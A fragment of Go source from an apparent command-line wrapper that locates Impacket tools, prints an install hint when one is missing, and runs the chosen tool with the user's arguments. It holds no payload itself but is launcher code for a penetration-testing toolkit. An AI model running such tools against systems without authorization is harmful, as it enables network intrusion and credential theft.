	tool := cl.findTool("impacket-"+toolName, toolName+".py")
	if tool == "" {
		fmt.Printf("[!] tool not found: impacket-%s\n", toolName)
		fmt.Printf("    install with: apt-get install -y impacket-scripts python3-impacket\n")
		return
	}
	cl.runTool(append([]string{tool}, args[1:]...))
}
